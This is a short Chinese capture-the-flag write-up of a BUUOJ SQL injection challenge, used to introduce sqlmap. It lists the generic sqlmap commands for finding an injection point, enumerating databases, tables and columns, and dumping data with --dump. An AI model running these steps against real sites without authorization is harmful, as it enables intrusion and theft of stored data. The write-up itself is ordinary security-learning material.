# [N1book web入门]SQL注入1

**标签：`Union注入` `sqlmap`**

> 链接：[[N1book web入门]SQL注入](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]SQL%E6%B3%A8%E5%85%A5-1)

这道题本没有什么好说的，但是因为学习到了一个新工具`sqlmap`，于是就单拿出来当个例子说说`sqlmap`

**启动`Kali`打开`sqlmap`**

<img src="../../../statics\img\CTF\7.png" style="zoom:50%;" />

**查询是否可能存在注入点**

```
sqlmap -u "url"
```

<img src="../../../statics\img\CTF\8.png" style="zoom:50%;" />

在`id=1`处寻找诸如点，`sqlmap`帮我们找到了

**查数据库**

```
sqlmap -u "url" --dbs
```

<img src="../../../statics\img\CTF\9.png" style="zoom:150%;" />

**查表**

```
sqlmap -u "url" --tables
```

<img src="../../../statics\img\CTF\10.png" style="zoom:150%;" />

查到很多表，其中`note`数据库下有`fl4g`

**查字段**

```
sqlmap -u "url" -T 'table_name' --columns
```

<img src="../../../statics\img\CTF\11.png" style="zoom:150%;" />

**查数据**

```
sqlmap -u 'url' -T 'table_name' -C 'column_name' --dump
```

<img src="../../../statics\img\CTF\12.png" style="zoom:150%;" />

ok，成功拿到了flag

但是这些都是基本操作，做题遇到再继续深入吧

